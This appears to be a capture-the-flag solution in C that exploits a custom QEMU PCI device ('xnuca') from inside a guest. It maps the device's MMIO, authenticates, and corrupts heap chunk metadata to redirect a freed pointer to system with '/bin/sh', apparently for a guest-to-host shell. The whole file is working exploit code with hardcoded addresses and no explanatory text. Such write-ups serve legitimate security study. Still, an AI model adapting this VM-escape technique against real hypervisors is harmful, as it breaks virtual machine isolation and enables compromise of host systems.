/* 
 * author: luckasdf0
 * build: diet gcc ./solve.c -static -o exploit && gzip -kf exploit && base64 exploit.gz
 */
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

unsigned char* iomem;
unsigned char* buf;
uint64_t buf_phys_addr;

void xnuca_read_authed();

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void hexdump(uint8_t* mem, size_t len)
{
    for (size_t i = 1; i <= len; i++) {
        printf("%02x ", mem[i-1]);
        if (i % 16 == 0)
            printf("\n");
        else if (i % 8 == 0)
            printf("  ");
    }
}

// See https://www.kernel.org/doc/Documentation/vm/pagemap.txt
uint64_t virt2phys(void* p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        die("read");

    // Assert page present
    assert(phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}

void iowrite(uint64_t addr, uint64_t value)
{
    *((uint64_t*)(iomem + addr)) = value;
}

uint64_t ioread(uint64_t addr)
{
    return *((uint64_t*)(iomem + addr));
}

void xnuca_auth()
{
    xnuca_read_authed();
    iowrite(0x10, 'X');
    xnuca_read_authed();
    iowrite(0x10, 'n');
    xnuca_read_authed();
    iowrite(0x10, 'u');
    xnuca_read_authed();
    iowrite(0x10, 'c');
    xnuca_read_authed();
    iowrite(0x10, 'a');
    xnuca_read_authed();
}

void xnuca_set_timer()
{
    iowrite(0x20, 0x0);
}

void xnuca_read_state() {
    printf("state : %llu\n", ioread(0x20));
}

void xnuca_read_authed() {
    printf("authed size: %llu\n", ioread(0x10));
}

void xnuca_alloc(uint8_t idx, uint8_t size) {
    uint64_t addr = ((0x30) | (idx&0xf)<<8) | ((1&0xf)<<12) | ((size&0xff)<<16);
    printf("xnuca  alloc %llx\n", addr);
    iowrite(addr, 0x0);
}

void xnuca_edit(uint8_t idx, uint8_t offset, uint64_t val) {
    //idx   : [0, 16)
    //offset: [0, 256)
    uint64_t addr = ((0x30) | (idx&0xf)<<8) | ((2&0xf)<<12) | ((offset&0xff)<<16);
    printf("xnuca  1 %llx\n", addr);
    iowrite(addr, val);
}

void xnuca_free(uint8_t idx) {
    uint64_t addr = ((0x30) | (idx&0xf)<<8) | ((3&0xf)<<12) | ((0x0&0xff)<<16);
    printf("xnuca  1 %llx\n", addr);
    iowrite(addr, 0x0);
}

int main(int argc, char *argv[])
{
    // Open and map I/O memory for the hitb device
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd == -1)
        die("open");

    iomem = mmap(0, 0x1000000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (iomem == MAP_FAILED)
        die("mmap");

    printf("iomem @ %p\n", iomem);

    // Allocate buffer and obtain its physical address
    buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED)
        die("mmap");

    mlock(buf, 0x1000);
    buf_phys_addr = virt2phys(buf);

    printf("buffer (virt) @ %p\n", buf);
    printf("buffer (phys) @ %p\n", (void*)buf_phys_addr);

    xnuca_auth();
    xnuca_read_state();
    xnuca_set_timer();

    for (int i = 0; i < 0x100; i++) {
        xnuca_alloc(0x0, 0x80);
    }
    xnuca_alloc(0x2, 0x80);
    xnuca_edit(0x2, 0x0, 0x6e69622f);
    xnuca_edit(0x2, 0x4, 0x68732f);


    xnuca_alloc(0x3, 0x80);
    xnuca_alloc(0x4, 0x80);

    xnuca_edit(0x3, 0x0, 0x0);
    xnuca_edit(0x3, 0x4, 0x0);
    xnuca_edit(0x3, 0x8, 0x81);
    xnuca_edit(0x3, 0xc, 0x0);
    xnuca_edit(0x3, 0x10, 0x13a7ae0+0x18-0x18);
    xnuca_edit(0x3, 0x14, 0x0);
    xnuca_edit(0x3, 0x18, 0x13a7ae0+0x18-0x10);
    xnuca_edit(0x3, 0x1c, 0x0);
    xnuca_edit(0x3, 0x80, 0x80);
    xnuca_edit(0x3, 0x88, 0x90);

    xnuca_edit(0x3, 0x88, 0x90);
    xnuca_free(0x4);

    xnuca_edit(0x3, 0x0, 0x11B92C8);
    xnuca_edit(0x0, 0x0, 0x411420);
    xnuca_edit(0x0, 0x4, 0x0);

    xnuca_free(0x2);

    return 0;
}
